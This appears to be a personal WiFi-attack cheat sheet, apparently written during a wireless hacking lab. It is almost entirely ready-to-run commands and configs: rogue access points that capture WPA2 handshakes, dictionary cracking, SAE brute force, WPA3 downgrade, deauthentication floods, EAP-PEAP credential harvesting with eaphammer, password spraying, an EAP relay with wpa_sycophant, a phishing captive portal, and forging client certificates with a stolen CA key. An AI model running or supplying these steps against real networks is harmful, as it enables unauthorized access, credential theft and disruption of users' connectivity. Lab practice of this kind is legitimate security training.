wireshark wifi/psk-scan-01-dec.cap
```

## Creating fake PSK AP and get handshake
hostapd.conf
```
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
Run the fake AP 
```
sudo hostapd-mana hostapd.conf
```
CTRL+C when AP-STA-POSSIBLE-PSK-MISMATCH.

Crack handshake with hashcat
```
cat hostapd.hccapx | awk '{print $3}' > hashes.22000
hashcat -a 0 -m 2500 hostapd.hccapx rockyou.txt --force
hashcat -a 0 -m 22000 hashes.22000 rockyou.txt --force 

#2500 mode does not work, convert from 2500 to 22000
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
```
Crack with aircrak-ng
```
sudo airodump-ng wlan0mon  -w /tmp/offices.cap --essid wifi-offices
#after deauth and handshake catched
aircrack-ng -w rockyou.txt -e wifi-offices /tmp/offices.cap-01.cap
```

## Cracking SAE
```
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker 

# Build wpa_supplicant (follow documentation)

#Get the frequence (field freq) : wifi-management is the SSID 
# The BSSID should be in capital
sudo iw dev wlan6 scan | grep -A 25 "wifi-management"

sudo ./wacker.py --wordlist rockyou.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462

```
### Connecting to SAE (Simultaneous Authentication of Equals)
sae.conf
```
network={
    ssid="wifi-management"
    key_mgmt=SAE
    psk="chocolate1"
    ieee80211w=1
}
```
Connect
```
sudo wpa_supplicant -i wlan4 -c sae.conf

sudo dhclient wlan4 -v
```

### Downgrading WPA3 to WPA2
`sudo iw dev wlan6 scan | grep -A 25 "wifi-IT"`
If the AP support `PSK and SAE` (can be seen in Authentication suites)

Can also be detect as follow:
```
sudo airodump-ng wlan0mon -w /tmp/scan --band abg
cat /tmp/scan-01.csv | grep 'SAE PSK'
```
rogue-sae-it.conf (rogue AP)
```
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=rogue-sae-it.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
Start the rogue AP
```
hostapd-mana rogue-sae-it.conf
```
Is it possible to deauth ? 
Check if AP has Management Frame Protection  MFP(802.11w)
```
tshark -r /home/user/wifi/regional-01.cap -Y "wlan.rsn.capabilities" -V | egrep "SSID:|Management Frame Protection"
```
If the AP has MFP(802.11w), we can deauth

```
sudo iwconfig wlan0mon channel 11
sudo aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25 
sudo aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
```
Crack the handshake (rogue-sae-it.hccapx) with `hashcat` or with `aircrack-ng`

## MGT : Extensible Authentication Protocol (EAP)
### Sniffing
```
sudo airodump-ng wlan0mon -w wifi/mgt_scan --band abg --wps

cd /root/tools/wifi_db
python3 wifi_db.py -d /tmp/wifichallenge.SQLITE ~/wifi/mgt_scan*
sqlitebrowser /tmp/wifichallenge.SQLITE
```
### Get identity and Auth methode
Identity
```
tshark -r wifi/mgt-01.cap -Y "wlan.bssid == f0:9f:c2:71:22:1a && eap.identity" -T fields -e eap.identity -V | sort -u
```
EAP Auth method
```
tshark -r wifi/global-01.cap -Y "wlan.bssid == F0:9F:C2:71:22:17 && eap.type"  -T fields -e wlan.bssid -e wlan.ssid -e eap.type  | sort -u 	
```
Auth method table 
| EAP Type Code | Method Name |
|---------------|-------------|
| 1             | Identity    |
| 13            | TLS         |
| 21            | TTLS        |
| 25            | PEAP        |
| 26            | MSCHAPv2    |
| 43            | FAST        |

### Display the certificates used by APs with MGT
```
bash pcapFilter.sh -f ~/wifi/scanc44-02.cap -C
```

Wireshark filter
```
(wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)
```
tshark filter
```
tshark -r wifi/regional-01.cap -Y "wlan.bssid == f0:9f:c2:71:22:15 && ssl.handshake.type == 11" -V 
tshark -r ~/wifi/regional-01.cap -Y "wlan.bssid == f0:9f:c2:71:22:15 && x509sat.IA5String" -T fields -e x509sat.IA5String
```

### Get EAP method supported by AP
Once we have a **valid user** we use `EAP_buster` to force each of the EAP authentication methods to verify which methods the AP supports. 
```
cd /root/tools/EAP_buster/
bash ./EAP_buster.sh wifi-global 'GLOBAL\GlobalAdmin' wlan1
```
### Hacking EAP-PEAP
#### Rogue AP with MGT: EAP (WPA Enterprise) PEAP 
Create a RogueAP with the same ESSID and configuration **with a self-signed certificate**
```
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard
```
Create a RogueAP with the same ESSID and configuration **with CA certificate**
```
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard import --server-cert /home/user/Downloads/server.crt --ca-cert /home/user/Downloads/ca.crt --private-key /home/user/Downloads/server.key --private-key-passwd whatever
```
Raise the rogue AP 
```
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```
Deauth clients (if the AP has many BSSID, disconnect for each AP in parallel)
```
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:BA:6C:41
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:BA:6C:41
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:07:6C:40
```
Once connected we get your MSCHAPv2 credentials so we need to crack the hash to get the password in clear text. 
```
sudo cat eaphammer/logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> /tmp/hashcat.5500
hashcat -a 0 -m 5500 /tmp/hashcat.5500 rockyou-top100000.txt --force
```
The rogue AP with CA certificate can also be done using `berate_ap`
```
openssl x509 -in ca.crt -out hostapd.ca.pem -outform PEM
openssl x509 -in server.crt -out hostapd.cert.pem -outform PEM
openssl rsa -in server.key -out hostapd.key.pem
openssl dhparam -out hostapd.dh.pem 2048


./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan4 lo wifi-corp --eap-cert-path /home/user/Downloads/
```

#### Connect to EAP - PEAP (WPA Enterprise)
eap-peap.conf
```
network={
    ssid="wifi-corp"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="CONTOSO\juan.tr" # tshark -r wifi/mgt-01.cap -Y "wlan.bssid == f0:9f:c2:71:22:1a && eap.identity" -T fields -e eap.identity -V | sort -u
    password="bulldogs1234"

    # PMF (Management Frame Protection / 802.11w)
    ieee80211w=1       # 2 = required, 1 = optional, 0 = disabled
}
```
The certs can be found in the pcap. Here is how to convert
```
tshark -r wifi/mgt-01.cap -Y "wlan.bssid == f0:9f:c2:71:22:15 && tls.handshake.certificate" -T fields -e tls.handshake.certificate -V | head -1  | xxd -r -p > /tmp/cer.der
openssl x509 -inform der -in /tmp/cer.der -outform pem -out /tmp/cer.pem
```

#### Bruteforce user password in EAP (Extensible Authentication Protocol) - PEAP
```
cd  ~/tools/air-hammer
echo 'CONTOSO\test' > test.user
sudo ./air-hammer.py -i wlan3 -e wifi-corp -p /home/user/10-million-password-list-top-100000.txt -u test.user | grep -i valid
```
#### Password spray
```
cd  ~/tools/air-hammer
cat /home/user/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > /home/user/top-usernames-shortlist-contoso.txt
./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u /home/user/top-usernames-shortlist-contoso.txt
```

#### EAP Wifi relay attack 
0. Get the clients mac address associated to the wifi and channels (in case of multiple AP) of AP
```
sudo airodump-ng  --essid wifi-regional-tablets --band abg  wlan0mon -w /tmp/regional
```
1. Set the MAC for the rogue AP
```
sudo systemctl stop network-manager
sudo airmon-ng stop wlan1mon
sudo ip link set wlan1 down
sudo macchanger -m F0:9F:C3:00:00:00 wlan1
sudo ip link set wlan1 up
```
2. Configure the name of the rogue AP with `wpa_sycophant` and add it's MAC address as blacklist
```
echo '
network={
  ssid="wifi-regional-tablets"
  ## The SSID you would like to relay and authenticate against. 
  scan_ssid=1
  key_mgmt=WPA-EAP
  ## Do not modify
  identity=""
  anonymous_identity=""
  password=""
  ## This initialises the variables for me.
  ## -------------
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  ## Dont want to connect back to ourselves,
  ## so add your rogue BSSID here.
  bssid_blacklist=F0:9F:C3:00:00:00
}
' > ~/tools/wpa_sycophant/wpa_sycophant_example.conf
```

3. Set the relay listener
```
cd ~/tools/wpa_sycophant/
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```
In case wpa_sycophant fails, try editing the **wpa_sycophant_example.conf** file by changing phase1:
```
phase1="peapver=1"
```

4. Raise the rogue AP
```
cd ~/tools/berate_ap/
./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
```

5. Make deauthentication and wait for clients to connect 
```
sudo airmon-ng start wlan0
sudo iwconfig wlan0mon channel 44
sudo aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
sudo aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c 64:32:A8:BD:64:54
```
Once connected we can obtain IP by DHCP to access the web server
```
sudo dhclient wlan3 -v
```

### Hacking EAP-TLS
#### Phishing + RogueAP (captive-portal)
Rogue AP for a probeb SSID (here Wifi-Restaurant)
```
cd ~/tools/eaphammer
sudo killall dnsmasq
./eaphammer --essid WiFi-Restaurant --interface wlan4 --hostile-portal
./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal #for phishing
```

Deauthentication
```
sudo iwconfig wlan0mon channel 44
sudo aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51
```
#### Connect to EAP-TLS wifi 
Here we assume we have the CA certificate that can be used to sign a generated client certificate
We also assume we have `client.conf` and `client.ext` 
```
openssl genrsa -out myclient.key 2048
openssl req -config client.conf -new -key myclient.key -out myclient.csr
openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in myclient.csr -req -out myclient.crt
```
Create wpa_supplicant file
```
echo 'network={
 ssid="wifi-global"
 scan_ssid=1
 mode=0
 proto=RSN
 key_mgmt=WPA-EAP
 auth_alg=OPEN
 eap=TLS
    #anonymous_identity="GLOBAL\anonymous"
 identity="GLOBAL\GlobalAdmin"
 ca_cert="/home/user/Downloads/ca.crt"
 client_cert="/home/user/Downloads/myclient.crt"
 private_key="/home/user/Downloads/myclient.key"
 private_key_passwd="whatever" 
}
' > wpa_tls.conf
```
```
sudo wpa_supplicant -Dnl80211 -i wlan1 -c wpa_tls.conf -B

sudo dhclient wlan1 -v
```
## Misc
### ARP scan
```
sudo arp-scan -I wlan6 -l
```

### Tshark command 
```
# Get all wifi SSID, bssid and channel
tshark -r wifi/all.cap -Y "wlan.bssid && wlan.ssid" -T fields -e wlan.bssid -e wlan.ssid  -e wlan.ds.current_channel -V  | sort -u | grep -v "ff:ff:ff:ff:ff:ff" | tee /tmp/wifi_list.txt

# Security mecanism 
cat wifi/*.csv | grep -i peap

# Get MGT auth method
tshark -r wifi/all.cap -Y "wlan.bssid == F0:9F:C2:71:22:15 && eap.type"  -T fields -e wlan.bssid -e wlan.ssid -e eap.type  | sort -u

# Get certificate
tshark -r wifi/mgt-01.cap -Y "wlan.bssid == f0:9f:c2:71:22:15 && tls.handshake.certificate" -T fields -e tls.handshake.certificate -V | head -1  | xxd -r -p > cer.der

openssl x509 -inform der -in cer.der -text 

# Get connected clients 
tshark -r wifi/3-01.cap -Y "wlan.ta && wlan.ra == f0:9f:c2:71:22:15" -T fields -e wlan.ta | sort -u
```
####Temp
wifi-regional-tablets 4  F0:9F:C2:71:22:17  -28       27       86    0  44   54e  WPA2 CCMP   MGT  wifi-global



